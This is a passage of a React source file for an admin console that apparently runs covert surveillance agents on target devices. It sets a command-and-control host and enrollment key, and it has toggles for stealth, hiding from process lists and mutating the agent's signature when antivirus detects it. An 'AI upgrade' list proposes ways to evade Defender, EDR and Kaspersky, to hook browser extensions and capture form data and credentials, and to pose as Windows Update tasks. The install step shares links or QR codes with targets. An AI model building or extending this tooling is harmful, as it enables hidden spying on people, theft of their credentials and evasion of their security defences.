/**
 * Improved Admin Dashboard (Software B)
 * Software B controls Software A — on/off per platform, no expiry on agents.
 */

import React, { useState } from 'react';
import { InstallLinkGenerator } from '../components/InstallLinkGenerator';
import { QRCodeManager } from '../components/QRCodeManager';

interface AdminDashboardProps {
  organizationId: string;
  adminEmail: string;
}

type ViewType = 'overview' | 'devices' | 'install-links' | 'qr-codes' | 'settings' | 'ai-upgrade' | 'software-a-control';

interface AIUpgrade {
  id: string;
  category: string;
  title: string;
  description: string;
  impact: 'low' | 'medium' | 'high' | 'critical';
  learned: string;
  status: 'pending' | 'approved' | 'rejected' | 'applying' | 'applied';
}

const INITIAL_UPGRADES: AIUpgrade[] = [
  {
    id: 'u1', category: 'Stealth', impact: 'high',
    title: 'Process Name Rotation',
    description: "Randomly rotate the agent's process name every 4 hours to evade process-based detection. Learned from Windows Defender scan patterns on EXEC-LAPTOP-01.",
    learned: 'Detected 3 near-miss AV signature matches in the last 24h on Windows hosts.',
    status: 'pending',
  },
  {
    id: 'u2', category: 'Network', impact: 'medium',
    title: 'DNS-over-HTTPS Fallback',
    description: 'Add DoH as a secondary C2 channel when standard HTTPS is blocked. Learned from network firewall rules observed on corporate WiFi.',
    learned: 'Corporate proxy blocked outbound port 443 on 2 devices; DoH on port 443 was unfiltered.',
    status: 'pending',
  },
  {
    id: 'u3', category: 'Persistence', impact: 'critical',
    title: 'Scheduled Task Mutation',
    description: 'Rename scheduled task entry to match a legitimate Windows Update task. Reduces detection by endpoint EDR tools.',
    learned: 'EDR telemetry on WORKSTATION-WIN11 flagged the current task name "bixtx-beacon".',
    status: 'pending',
  },
  {
    id: 'u4', category: 'Data Collection', impact: 'medium',
    title: 'Browser Extension Hooking',
    description: 'Inject lightweight hook into Chromium extensions to intercept form data before encryption. Works on Chrome, Edge, Brave.',
    learned: 'Target uses Chrome with password manager; credentials captured via keylogger are partial.',
    status: 'pending',
  },
  {
    id: 'u5', category: 'Evasion', impact: 'high',
    title: 'Memory Signature Scrambler',
    description: 'Apply polymorphic XOR to in-memory payload headers on each boot cycle. Defeats memory-scan signatures.',
    learned: 'Kaspersky cloud scan matched agent memory pattern on MacBook-Pro-M3 (confidence 71%).',
    status: 'pending',
  },
];

interface PlatformControl {
  id: string;
  label: string;
  icon: string;
  category: 'Desktop' | 'Mobile' | 'Integration';
  devStatus: 'not-started' | 'in-progress' | 'complete';
  complexity: string;
  enabled: boolean;
}

const INITIAL_PLATFORM_CONTROLS: PlatformControl[] = [
  { id: 'win',     label: 'Desktop Agent (Windows)',  icon: '⊞', category: 'Desktop',     devStatus: 'not-started', complexity: 'High',      enabled: false },
  { id: 'macos',   label: 'Desktop Agent (macOS)',    icon: '⌘', category: 'Desktop',     devStatus: 'not-started', complexity: 'High',      enabled: false },
  { id: 'linux',   label: 'Desktop Agent (Linux)',    icon: '◉', category: 'Desktop',     devStatus: 'not-started', complexity: 'Medium',    enabled: false },
  { id: 'android', label: 'Android App',              icon: '◆', category: 'Mobile',      devStatus: 'not-started', complexity: 'High',      enabled: false },
  { id: 'ios',     label: 'iOS App',                  icon: '◇', category: 'Mobile',      devStatus: 'not-started', complexity: 'High',      enabled: false },
  { id: 'webrtc',  label: 'WebRTC Integration',       icon: '🌐', category: 'Integration', devStatus: 'not-started', complexity: 'High',      enabled: false },
  { id: 'sec',     label: 'Security Implementation',  icon: '🔐', category: 'Integration', devStatus: 'not-started', complexity: 'Very High', enabled: false },
];

export const ImprovedAdminDashboard: React.FC<AdminDashboardProps> = ({
  organizationId,
  adminEmail,
}) => {
  const [currentView, setCurrentView] = useState<ViewType>('overview');
  const [upgrades, setUpgrades] = useState<AIUpgrade[]>(INITIAL_UPGRADES);
  const [scanning, setScanning] = useState(false);
  const [scanProgress, setScanProgress] = useState(0);
  const [settingsToast, setSettingsToast] = useState('');
  const [softwareAEnabled, setSoftwareAEnabled] = useState(false);
  const [platformControls, setPlatformControls] = useState<PlatformControl[]>(INITIAL_PLATFORM_CONTROLS);
  const [toast, setToast] = useState('');

  const showToast = (msg: string) => { setToast(msg); setTimeout(() => setToast(''), 2500); };
  const showSettingsToast = (msg: string) => { setSettingsToast(msg); setTimeout(() => setSettingsToast(''), 2500); };

  const [c2Host, setC2Host] = useState('api.bixtx.com');
  const [c2Port, setC2Port] = useState('3001');
  const [c2Proto, setC2Proto] = useState('wss');
  const [enrollKey, setEnrollKey] = useState('BTX-2026-ALPHA');
  const [agentToggles, setAgentToggles] = useState([
    { key:'beaconJitter', label:'Beacon Jitter',            desc:'Randomise beacon interval ±30%',                   on:true,  color:'#3b82f6' },
    { key:'autoMutate',   label:'Auto-Mutate on Detection', desc:'Rotate signature when AV detects agent',            on:true,  color:'#ef4444' },
    { key:'offlineRec',   label:'Offline Recording',        desc:'Buffer data locally when C2 unreachable',           on:true,  color:'#10d9a0' },
    { key:'stealth',      label:'Stealth Mode',             desc:'Hide from app switcher and process list',           on:false, color:'#10b981' },
    { key:'crashRec',     label:'Crash Recovery',           desc:'Auto-restart agent after unexpected crash',         on:true,  color:'#f59e0b' },
    { key:'tlsRotation',  label:'TLS Fingerprint Rotation', desc:'Rotate JA3 fingerprint every beacon cycle',         on:false, color:'#a855f7' },
  ]);
  const [notifToggles, setNotifToggles] = useState([
    { key:'email',  label:'Email Alerts',       desc:'Send email on critical events',        on:true,  color:'#3b82f6' },
    { key:'sms',    label:'SMS Alerts',          desc:'SMS on device offline or geo-breach',  on:false, color:'#10b981' },
    { key:'push',   label:'Push Notifications',  desc:'Browser push on new data',             on:true,  color:'#10d9a0' },
    { key:'audit',  label:'Audit Logging',       desc:'Log all admin actions to audit file',  on:true,  color:'#f59e0b' },
  ]);

  const pendingCount = upgrades.filter(u => u.status === 'pending').length;

  const handleApprove = (id: string) => {
    setUpgrades(prev => prev.map(u => u.id === id ? { ...u, status: 'applying' } : u));
    setTimeout(() => {
      setUpgrades(prev => prev.map(u => u.id === id ? { ...u, status: 'applied' } : u));
    }, 1800);
  };

  const handleReject = (id: string) => {
    setUpgrades(prev => prev.map(u => u.id === id ? { ...u, status: 'rejected' } : u));
  };

  const handleRescan = () => {
    setScanning(true); setScanProgress(0);
    const iv = setInterval(() => {
      setScanProgress(p => {
        if (p >= 100) { clearInterval(iv); setScanning(false); return 100; }
        return p + 5;
      });
    }, 120);
  };

  const handleGlobalToggle = () => {
    const next = !softwareAEnabled;
    setSoftwareAEnabled(next);
    showToast(`Software A globally ${next ? 'ENABLED' : 'DISABLED'} by admin`);
  };

  const handlePlatformToggle = (id: string) => {
    if (!softwareAEnabled) {
      showToast('Enable Software A globally first');
      return;
    }
    setPlatformControls(prev => prev.map(p =>
      p.id === id ? { ...p, enabled: !p.enabled } : p
    ));
    const plat = platformControls.find(p => p.id === id);
    if (plat) showToast(`${plat.label} ${plat.enabled ? 'disabled' : 'enabled'}`);
  };

  const devStatusBadge = (s: PlatformControl['devStatus']) => {
    if (s === 'not-started') return 'bg-red-100 text-red-800';
    if (s === 'in-progress') return 'bg-yellow-100 text-yellow-800';
    return 'bg-green-100 text-green-800';
  };

  const devStatusLabel = (s: PlatformControl['devStatus']) => {
    if (s === 'not-started') return '⚠ Not Started';
    if (s === 'in-progress') return '⏳ In Progress';
    return '✓ Complete';
  };

  const enabledCount = platformControls.filter(p => p.enabled && softwareAEnabled).length;
  const notStartedCount = platformControls.filter(p => p.devStatus === 'not-started').length;

  return (
    <div className="min-h-screen bg-gray-50 flex">
      {/* Global toast */}
      {toast && (
        <div className="fixed top-4 right-4 z-50 bg-purple-700 text-white px-4 py-2.5 rounded-xl shadow-xl text-sm font-semibold">
          {toast}
        </div>
      )}

      {/* LEFT SIDEBAR */}
      <aside className="w-64 bg-white border-r border-gray-200 fixed h-screen overflow-y-auto">
        {/* Logo */}
        <div className="p-6 border-b border-gray-200">
          <div className="flex items-center space-x-3">
            <div className="text-4xl">🛡️</div>
            <div>
              <h1 className="text-xl font-bold text-gray-900">bixtx.com</h1>
              <p className="text-xs text-gray-500">Admin Dashboard (Software B)</p>
            </div>
          </div>
        </div>

        {/* Software A global status pill */}
        <div className="px-4 py-3 border-b border-gray-100">
          <div className={`flex items-center gap-2 px-3 py-2 rounded-lg text-sm font-semibold ${
            softwareAEnabled ? 'bg-green-50 text-green-800' : 'bg-red-50 text-red-800'
          }`}>
            <span className={`w-2 h-2 rounded-full flex-shrink-0 ${softwareAEnabled ? 'bg-green-500' : 'bg-red-500'}`}/>
            Software A: {softwareAEnabled ? 'ON' : 'OFF'}
          </div>
        </div>

        {/* Navigation Menu */}
        <nav className="p-4 space-y-2">
          <button
            onClick={() => setCurrentView('overview')}
            className={`w-full flex items-center space-x-3 px-4 py-3 rounded-lg transition-colors ${
              currentView === 'overview' ? 'bg-purple-100 text-purple-700 font-semibold' : 'text-gray-700 hover:bg-gray-100'
            }`}
          >
            <span className="text-2xl">📊</span>
            <span>Overview</span>
          </button>

          {/* Software A Control — primary action */}
          <button
            onClick={() => setCurrentView('software-a-control')}
            className={`w-full flex items-center space-x-3 px-4 py-3 rounded-lg transition-all relative ${
              currentView === 'software-a-control'
                ? 'bg-gradient-to-r from-indigo-600 to-purple-600 text-white font-bold shadow-lg'
                : 'bg-gradient-to-r from-indigo-500 to-purple-500 text-white font-semibold hover:shadow-lg'
            }`}
          >
            <span className="text-2xl">🎛️</span>
            <div className="flex-1 text-left">
              <div className="flex items-center justify-between">
                <span>Software A Control</span>
                {notStartedCount > 0 && (
                  <span className="px-2 py-0.5 bg-red-400 text-white rounded-full text-[10px] font-bold">
                    {notStartedCount} pending
                  </span>
                )}
              </div>
              <p className="text-xs text-indigo-100 mt-0.5">Admin On/Off · No Expiry</p>
            </div>
          </button>

          {/* QR Code Manager */}
          <button
            onClick={() => setCurrentView('qr-codes')}
            className={`w-full flex items-center space-x-3 px-4 py-3 rounded-lg transition-all relative ${
              currentView === 'qr-codes'
                ? 'bg-gradient-to-r from-purple-600 to-indigo-600 text-white font-bold shadow-lg scale-105'
                : 'bg-gradient-to-r from-purple-500 to-indigo-500 text-white font-semibold hover:shadow-lg hover:scale-105'
            }`}
          >
            <span className="text-2xl">📱</span>
            <div className="flex-1 text-left">
              <span>QR Code Manager</span>
              <p className="text-xs text-purple-100 mt-0.5">Software A Installation</p>
            </div>
          </button>

          <button
            onClick={() => setCurrentView('devices')}
            className={`w-full flex items-center space-x-3 px-4 py-3 rounded-lg transition-colors ${
              currentView === 'devices' ? 'bg-purple-100 text-purple-700 font-semibold' : 'text-gray-700 hover:bg-gray-100'
            }`}
          >
            <span className="text-2xl">💻</span>
            <span>Devices</span>
          </button>

          <button
            onClick={() => setCurrentView('install-links')}
            className={`w-full flex items-center space-x-3 px-4 py-3 rounded-lg transition-colors ${
              currentView === 'install-links' ? 'bg-purple-100 text-purple-700 font-semibold' : 'text-gray-700 hover:bg-gray-100'
            }`}
          >
            <span className="text-2xl">🔗</span>
            <span>Installation Links</span>
          </button>

          <button
            onClick={() => setCurrentView('ai-upgrade')}
            className={`w-full flex items-center space-x-3 px-4 py-3 rounded-lg transition-colors relative ${
              currentView === 'ai-upgrade' ? 'bg-purple-100 text-purple-700 font-semibold' : 'text-gray-700 hover:bg-gray-100'
            }`}
          >
            <span className="text-2xl">🧠</span>
            <span>AI Upgrades</span>
            {pendingCount > 0 && (
              <span className="absolute right-3 top-2.5 w-5 h-5 bg-red-500 text-white rounded-full text-[10px] font-bold flex items-center justify-center">
                {pendingCount}
              </span>
            )}
          </button>

          <button
            onClick={() => setCurrentView('settings')}
            className={`w-full flex items-center space-x-3 px-4 py-3 rounded-lg transition-colors ${
              currentView === 'settings' ? 'bg-purple-100 text-purple-700 font-semibold' : 'text-gray-700 hover:bg-gray-100'
            }`}
          >
            <span className="text-2xl">⚙️</span>
            <span>Settings</span>
          </button>
        </nav>

        {/* Software A quick toggle in sidebar */}
        <div className="p-4 m-4 rounded-lg border-2 border-indigo-200 bg-indigo-50">
          <div className="text-center">
            <div className="text-3xl mb-1">🎛️</div>
            <h3 className="font-bold text-indigo-900 text-sm mb-1">Software A</h3>
            <p className="text-xs text-indigo-700 mb-3">
              {softwareAEnabled ? `${enabledCount}/${platformControls.length} platforms active` : 'Globally disabled'}
            </p>
            <button
              onClick={handleGlobalToggle}
              className={`w-full px-3 py-2 rounded-lg text-sm font-bold transition-colors ${
                softwareAEnabled
                  ? 'bg-red-600 text-white hover:bg-red-700'
                  : 'bg-green-600 text-white hover:bg-green-700'
              }`}
            >
              {softwareAEnabled ? '⏹ Disable All' : '▶ Enable Software A'}
            </button>
          </div>
        </div>
      </aside>

      {/* MAIN CONTENT */}
      <main className="flex-1 ml-64">
        {/* Top Header */}
        <header className="bg-white border-b border-gray-200 sticky top-0 z-10">
          <div className="px-8 py-4 flex items-center justify-between">
            <div>
              <h2 className="text-2xl font-bold text-gray-900">
                {currentView === 'overview'          && '📊 Dashboard Overview'}
                {currentView === 'software-a-control' && '🎛️ Software A Control — Admin On/Off'}
                {currentView === 'qr-codes'           && '📱 QR Code Manager — Software A'}
                {currentView === 'devices'            && '💻 Device Management'}
                {currentView === 'install-links'      && '🔗 Installation Links'}
                {currentView === 'settings'           && '⚙️ Settings'}
                {currentView === 'ai-upgrade'         && '🧠 AI Self-Upgrade Engine'}
              </h2>
              {currentView === 'qr-codes' && (
                <p className="text-sm text-gray-600 mt-1">
                  Generate QR codes for Software A installation — Admin Controlled (No Expiry)
                </p>
              )}
              {currentView === 'software-a-control' && (
                <p className="text-sm text-gray-600 mt-1">
                  Control Software A access per platform. No expiry — you decide when agents are on or off.
                </p>
              )}
            </div>
            <div className="flex items-center space-x-4">
              <div className="text-right">
                <p className="text-sm font-medium text-gray-900">{adminEmail}</p>
                <p className="text-xs text-gray-500">Administrator</p>
              </div>
              <div className="w-10 h-10 bg-purple-600 rounded-full flex items-center justify-center">
                <span className="text-white text-lg">👤</span>
              </div>
            </div>
          </div>
        </header>

        {/* Content Area */}
        <div className="p-8">

          {/* ── SOFTWARE A CONTROL ── */}
          {currentView === 'software-a-control' && (
            <div className="space-y-6">
              {/* Global on/off banner */}
              <div className={`rounded-2xl p-6 flex items-center justify-between gap-6 border-2 ${
                softwareAEnabled
                  ? 'bg-green-50 border-green-300'
                  : 'bg-red-50 border-red-300'
              }`}>
                <div>
                  <h3 className="text-xl font-bold text-gray-900 mb-1">
                    {softwareAEnabled ? '✅ Software A — ENABLED' : '🔴 Software A — DISABLED'}
                  </h3>
                  <p className="text-sm text-gray-600">
                    {softwareAEnabled
                      ? 'Agents on enabled platforms are active. Toggle individual platforms below.'
                      : 'All Software A agents are globally off. No platform can be activated until you enable Software A.'}
                  </p>
                </div>
                <button
                  onClick={handleGlobalToggle}
                  className={`flex-shrink-0 px-8 py-4 rounded-xl font-bold text-lg transition-colors shadow-lg ${
                    softwareAEnabled
                      ? 'bg-red-600 text-white hover:bg-red-700'
                      : 'bg-green-600 text-white hover:bg-green-700'
                  }`}
                >
                  {softwareAEnabled ? '⏹ Disable Software A' : '▶ Enable Software A'}
                </button>
              </div>

              {/* Development status summary */}
              <div className="bg-amber-50 border border-amber-300 rounded-xl p-5">
                <div className="flex items-start gap-3">
                  <span className="text-2xl flex-shrink-0">⚠️</span>
                  <div>
                    <h4 className="font-bold text-amber-900 mb-1">Development Status — Software A (Link Agent)</h4>
                    <p className="text-sm text-amber-800 mb-2">
                      As per the System Summary document: all Software A platform agents are currently <strong>Not Started</strong>.
                      Development is estimated at 6–12 months. Platform toggles are pre-configured for when agents are ready to deploy.
                    </p>
                    <div className="flex flex-wrap gap-2">
                      <span className="px-2 py-1 bg-red-100 text-red-800 rounded text-xs font-semibold">⚠ {notStartedCount} Not Started</span>
                      <span className="px-2 py-1 bg-gray-100 text-gray-700 rounded text-xs font-semibold">Est. 6–12 months dev</span>
                      <span className="px-2 py-1 bg-amber-100 text-amber-800 rounded text-xs font-semibold">NEEDS DEV</span>
                    </div>
                  </div>
                </div>
              </div>

              {/* Platform controls table */}
              <div className="bg-white rounded-xl shadow overflow-hidden border border-gray-200">
                <div className="px-6 py-4 border-b border-gray-200 bg-gray-50 flex items-center justify-between">
                  <h3 className="font-bold text-gray-900">Platform Control — Software A Agents</h3>
                  <div className="flex gap-2">
                    <button
                      onClick={() => {
                        if (!softwareAEnabled) { showToast('Enable Software A globally first'); return; }
                        setPlatformControls(prev => prev.map(p => ({ ...p, enabled: true })));
                        showToast('All platforms enabled');
                      }}
                      className="px-3 py-1.5 bg-green-100 text-green-700 rounded-lg text-xs font-semibold hover:bg-green-200 transition-colors">
                      ▶ Enable All
                    </button>
                    <button
                      onClick={() => {
                        setPlatformControls(prev => prev.map(p => ({ ...p, enabled: false })));
                        showToast('All platforms disabled');
                      }}
                      className="px-3 py-1.5 bg-red-100 text-red-700 rounded-lg text-xs font-semibold hover:bg-red-200 transition-colors">
                      ⏹ Disable All
                    </button>
                  </div>
                </div>
                <table className="w-full text-sm">
                  <thead>
                    <tr className="border-b border-gray-200 bg-gray-50">
                      {['Component', 'Category', 'Dev Status', 'Complexity', 'Admin Control'].map(h => (
                        <th key={h} className="text-left px-6 py-3 text-xs font-semibold text-gray-500 uppercase tracking-wider">{h}</th>
                      ))}
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-gray-100">
                    {platformControls.map(p => (
                      <tr key={p.id} className="hover:bg-gray-50 transition-colors">
                        <td className="px-6 py-4">
                          <div className="flex items-center gap-3">
                            <span className="text-xl">{p.icon}</span>
                            <span className="font-medium text-gray-900">{p.label}</span>
                          </div>
                        </td>
                        <td className="px-6 py-4">
                          <span className="px-2 py-1 bg-gray-100 text-gray-600 rounded text-xs font-mono">{p.category}</span>
                        </td>
                        <td className="px-6 py-4">
                          <span className={`px-2 py-1 rounded text-xs font-semibold ${devStatusBadge(p.devStatus)}`}>
                            {devStatusLabel(p.devStatus)}
                          </span>
                        </td>
                        <td className="px-6 py-4 text-gray-600 text-xs">{p.complexity}</td>
                        <td className="px-6 py-4">
                          <div className="flex items-center gap-3">
                            <button
                              onClick={() => handlePlatformToggle(p.id)}
                              className={`relative w-11 h-6 rounded-full transition-colors ${
                                p.enabled && softwareAEnabled ? 'bg-green-500' : 'bg-gray-300'
                              }`}
                              title={!softwareAEnabled ? 'Enable Software A globally first' : ''}
                            >
                              <div className={`absolute top-1 w-4 h-4 bg-white rounded-full shadow transition-all ${
                                p.enabled && softwareAEnabled ? 'left-6' : 'left-1'
                              }`}/>
                            </button>
                            <span className={`text-xs font-semibold ${
                              p.enabled && softwareAEnabled ? 'text-green-700' : 'text-gray-400'
                            }`}>
                              {p.enabled && softwareAEnabled ? 'ON' : 'OFF'}
                            </span>
                          </div>
                        </td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>

              {/* How it works */}
              <div className="bg-white rounded-xl shadow p-6 border border-purple-100">
                <h4 className="font-bold text-gray-900 mb-4">🔒 How Admin Control Works (No Expiry)</h4>
                <div className="grid grid-cols-1 md:grid-cols-4 gap-4">
                  {[
                    { icon: '1️⃣', title: 'Admin Enables', desc: 'Admin turns Software A ON globally in this panel' },
                    { icon: '2️⃣', title: 'Select Platforms', desc: 'Enable specific platforms (Windows, Android, iOS…)' },
                    { icon: '3️⃣', title: 'Agents Activate', desc: 'Enrolled agents on enabled platforms become active' },
                    { icon: '4️⃣', title: 'Admin Disables', desc: 'Admin turns OFF at any time — no expiry, permanent control' },
                  ].map(s => (
                    <div key={s.title} className="text-center p-4 bg-indigo-50 rounded-lg">
                      <div className="text-3xl mb-2">{s.icon}</div>
                      <p className="text-sm font-semibold text-gray-900">{s.title}</p>
                      <p className="text-xs text-gray-600 mt-1">{s.desc}</p>
                    </div>
                  ))}
                </div>
              </div>
            </div>
          )}

          {/* ── OVERVIEW ── */}
          {currentView === 'overview' && (
            <div className="space-y-8">
              <div className="grid grid-cols-1 md:grid-cols-4 gap-6">
                <div className="bg-white rounded-lg shadow p-6">
                  <div className="flex items-center justify-between">
                    <div>
                      <p className="text-sm text-gray-600">Total Devices</p>
                      <p className="text-3xl font-bold text-gray-900">247</p>
                    </div>
                    <div className="text-4xl">💻</div>
                  </div>
                </div>
                <div className="bg-white rounded-lg shadow p-6">
                  <div className="flex items-center justify-between">
                    <div>
                      <p className="text-sm text-gray-600">Active Links</p>
                      <p className="text-3xl font-bold text-green-600">12</p>
                    </div>
                    <div className="text-4xl">🔗</div>
                  </div>
                </div>
                <div className="bg-white rounded-lg shadow p-6">
                  <div className="flex items-center justify-between">
                    <div>
                      <p className="text-sm text-gray-600">Active QR Codes</p>
                      <p className="text-3xl font-bold text-purple-600">8</p>
                    </div>
                    <div className="text-4xl">📱</div>
                  </div>
                </div>
                <div className={`rounded-lg shadow p-6 ${softwareAEnabled ? 'bg-green-50 border-2 border-green-200' : 'bg-red-50 border-2 border-red-200'}`}>
                  <div className="flex items-center justify-between">
                    <div>
                      <p className="text-sm text-gray-600">Software A</p>
                      <p className={`text-3xl font-bold ${softwareAEnabled ? 'text-green-600' : 'text-red-600'}`}>
                        {softwareAEnabled ? 'ON' : 'OFF'}
                      </p>
                    </div>
                    <button
                      onClick={handleGlobalToggle}
                      className={`px-3 py-1.5 rounded-lg text-xs font-bold transition-colors ${
                        softwareAEnabled ? 'bg-red-100 text-red-700 hover:bg-red-200' : 'bg-green-100 text-green-700 hover:bg-green-200'
                      }`}
                    >
                      {softwareAEnabled ? 'Disable' : 'Enable'}
                    </button>
                  </div>
                </div>
              </div>

              {/* Software A Control Banner */}
              <div className="bg-gradient-to-r from-indigo-700 via-purple-700 to-indigo-600 rounded-xl shadow-2xl p-8 text-white">
                <div className="flex items-center justify-between flex-wrap gap-6">
                  <div className="flex-1">
                    <div className="flex items-center space-x-3 mb-3">
                      <div className="text-5xl">🎛️</div>
                      <div>
                        <h3 className="text-2xl font-bold mb-1">Software A Control</h3>
                        <p className="text-indigo-100">
                          Software B controls Software A — admin on/off per platform, no expiry
                        </p>
                      </div>
                    </div>
                    <div className="flex items-center flex-wrap gap-5 text-sm mb-4">
                      <div className="flex items-center space-x-2">
                        <span>⚡</span><span>Instant On/Off</span>
                      </div>
                      <div className="flex items-center space-x-2">
                        <span>🔒</span><span>Admin Controlled (No Expiry)</span>
                      </div>
                      <div className="flex items-center space-x-2">
                        <span>⚠️</span><span>{notStartedCount} Platforms Not Started</span>
                      </div>
                    </div>
                    <button
                      onClick={() => setCurrentView('software-a-control')}
                      className="px-6 py-3 bg-white text-indigo-700 rounded-lg font-bold hover:bg-indigo-50 transition-colors shadow-lg"
                    >
                      🎛️ Open Software A Control
                    </button>
                  </div>
                </div>
              </div>

              {/* QR Banner */}
              <div className="bg-gradient-to-r from-purple-600 via-purple-500 to-indigo-600 rounded-xl shadow-2xl p-8 text-white">
                <div className="flex items-center justify-between">
                  <div className="flex-1">
                    <div className="flex items-center space-x-3 mb-3">
                      <div className="text-5xl">📱</div>
                      <div>
                        <h3 className="text-2xl font-bold mb-1">QR Code Manager</h3>
                        <p className="text-purple-100">Create QR codes for Software A installation — Admin Controlled</p>
                      </div>
                    </div>
                    <div className="flex items-center space-x-6 text-sm mb-4">
                      <div className="flex items-center space-x-2"><span>⚡</span><span>Fast Installation</span></div>
                      <div className="flex items-center space-x-2"><span>🔒</span><span>Admin Controlled</span></div>
                      <div className="flex items-center space-x-2"><span>✅</span><span>Secure &amp; Tracked</span></div>
                    </div>
                    <button
                      onClick={() => setCurrentView('qr-codes')}
                      className="px-6 py-3 bg-white text-purple-600 rounded-lg font-bold hover:bg-purple-50 transition-colors shadow-lg"
                    >
                      🚀 Open QR Code Manager
                    </button>
                  </div>
                </div>
              </div>

              {/* Quick Actions */}
              <div>
                <h3 className="text-xl font-bold text-gray-900 mb-4">Quick Actions</h3>
                <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
                  <button onClick={() => setCurrentView('software-a-control')}
                    className="bg-gradient-to-br from-indigo-600 to-purple-600 rounded-xl shadow-lg p-6 text-left hover:shadow-2xl transition-all transform hover:scale-105 text-white">
                    <div className="text-4xl mb-3">🎛️</div>
                    <h4 className="text-xl font-bold mb-2">Software A Control</h4>
                    <p className="text-indigo-100 mb-3">Enable/disable Software A globally and per platform</p>
                    <div className="inline-block bg-white bg-opacity-20 px-3 py-1 rounded-full text-xs font-bold">
                      ⭐ PRIMARY CONTROL
                    </div>
                  </button>
                  <button onClick={() => setCurrentView('qr-codes')}
                    className="bg-gradient-to-br from-purple-600 to-indigo-600 rounded-xl shadow-lg p-6 text-left hover:shadow-2xl transition-all transform hover:scale-105 text-white">
                    <div className="text-4xl mb-3">📱</div>
                    <h4 className="text-xl font-bold mb-2">QR Code Manager</h4>
                    <p className="text-purple-100">Generate QR codes for Software A installation</p>
                  </button>
                  <button onClick={() => setCurrentView('devices')}
                    className="bg-white rounded-xl shadow-lg p-6 text-left hover:shadow-xl transition-all border-2 border-gray-200">
                    <div className="text-4xl mb-3">💻</div>
                    <h4 className="text-xl font-bold text-gray-900 mb-2">Manage Devices</h4>
                    <p className="text-gray-600">View and control all connected devices</p>
                  </button>
                </div>
              </div>

              {/* How-to guide */}
              <div className="bg-white rounded-xl shadow-lg p-6 border-2 border-purple-200">
                <div className="flex items-start space-x-4">
                  <div className="text-4xl">💡</div>
                  <div className="flex-1">
                    <h3 className="text-xl font-bold text-gray-900 mb-2">
                      How to Deploy Software A via Software B
                    </h3>
                    <div className="grid grid-cols-1 md:grid-cols-4 gap-4 mt-4">
                      {[
                        { n: '1️⃣', t: 'Enable Software A', d: 'Admin turns on globally in Software A Control' },
                        { n: '2️⃣', t: 'Select Platforms', d: 'Toggle individual platforms on/off' },
                        { n: '3️⃣', t: 'Generate QR / Link', d: 'Share install QR or link with target device' },
                        { n: '4️⃣', t: 'Admin Controls', d: 'Turn off at any time — no expiry ever' },
                      ].map(s => (
                        <div key={s.t} className="text-center p-4 bg-purple-50 rounded-lg">
                          <div className="text-3xl mb-2">{s.n}</div>
                          <p className="text-sm font-semibold text-gray-900">{s.t}</p>
                          <p className="text-xs text-gray-600 mt-1">{s.d}</p>
                        </div>
                      ))}
                    </div>
                    <button
                      onClick={() => setCurrentView('software-a-control')}
                      className="mt-4 px-6 py-2 bg-indigo-600 text-white rounded-lg font-semibold hover:bg-indigo-700 transition-colors"
                    >
                      Open Software A Control →
                    </button>
                  </div>
                </div>
              </div>
            </div>
          )}

          {/* QR CODE MANAGER */}
          {currentView === 'qr-codes' && (
            <QRCodeManager
              organizationId={organizationId}
              adminEmail={adminEmail}
              softwareAEnabled={softwareAEnabled}
            />
          )}

          {/* DEVICES */}
          {currentView === 'devices' && (
            <div className="bg-white rounded-lg shadow p-8">
              <div className="text-center py-12">
                <div className="text-6xl mb-4">💻</div>
                <h3 className="text-2xl font-bold text-gray-900 mb-2">Device Management</h3>
                <p className="text-gray-600">Device list will appear here once Software A agents are deployed.</p>
              </div>
            </div>
          )}

          {/* INSTALLATION LINKS */}
          {currentView === 'install-links' && (
            <InstallLinkGenerator
              organizationId={organizationId}
              adminEmail={adminEmail}
            />
          )}

          {/* SETTINGS */}
          {currentView === 'settings' && (
            <div className="space-y-6">
              {settingsToast && (
                <div className="fixed top-4 right-4 z-50 bg-green-600 text-white px-4 py-2.5 rounded-xl shadow-xl text-sm font-semibold">
                  ✓ {settingsToast}
                </div>
              )}
              <div className="flex items-center justify-between">
                <div>
                  <h2 className="text-2xl font-bold text-gray-900">Settings</h2>
                  <p className="text-sm text-gray-500 mt-0.5">Configure Software B behaviour, C2 connection, and notifications</p>
                </div>
                <button onClick={() => showSettingsToast('Settings saved')}
                  className="px-5 py-2.5 bg-purple-600 text-white rounded-xl font-semibold text-sm hover:bg-purple-700 transition-colors">
                  💾 Save All
                </button>
              </div>

              <div className="bg-white rounded-xl shadow p-6 border border-purple-100">
                <h3 className="text-base font-bold text-gray-900 mb-4 flex items-center gap-2">
                  🔗 C2 Connection
                  <span className="px-2 py-0.5 bg-green-100 text-green-700 text-xs rounded-full font-semibold">Connected</span>
                </h3>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  {[
                    { label:'C2 Host', value:c2Host, set:setC2Host },
                    { label:'C2 Port', value:c2Port, set:setC2Port },
                    { label:'Protocol', value:c2Proto, set:setC2Proto },
                    { label:'Enroll Key', value:enrollKey, set:setEnrollKey },
                  ].map(f => (
                    <div key={f.label}>
                      <label className="block text-sm font-medium text-gray-700 mb-1">{f.label}</label>
                      <input value={f.value} onChange={e => f.set(e.target.value)}
                        className="w-full px-3 py-2 border border-gray-300 rounded-lg text-sm font-mono focus:outline-none focus:ring-2 focus:ring-purple-500"/>
                    </div>
                  ))}
                </div>
                <div className="mt-4 flex gap-2">
                  <button onClick={() => showSettingsToast('Test connection successful')}
                    className="px-4 py-2 bg-purple-100 text-purple-700 rounded-lg text-sm font-semibold hover:bg-purple-200 transition-colors">
                    🔌 Test Connection
                  </button>
                  <button onClick={() => showSettingsToast('C2 reconnected')}
                    className="px-4 py-2 bg-gray-100 text-gray-700 rounded-lg text-sm font-semibold hover:bg-gray-200 transition-colors">
                    🔄 Reconnect
                  </button>
                </div>
              </div>

              <div className="bg-white rounded-xl shadow p-6 border border-purple-100">
                <h3 className="text-base font-bold text-gray-900 mb-4">🤖 Agent Behaviour</h3>
                <div className="space-y-4">
                  {agentToggles.map(t => (
                    <div key={t.key} className="flex items-center justify-between gap-4">
                      <div className="flex-1 min-w-0">
                        <div className="text-sm font-semibold text-gray-800">{t.label}</div>
                        <div className="text-xs text-gray-500">{t.desc}</div>
                      </div>
                      <button
                        onClick={() => { setAgentToggles(prev => prev.map(x => x.key===t.key ? {...x, on:!x.on} : x)); showSettingsToast(`${t.label} ${t.on ? 'disabled' : 'enabled'}`); }}
                        className="relative w-11 h-6 rounded-full transition-colors flex-shrink-0"
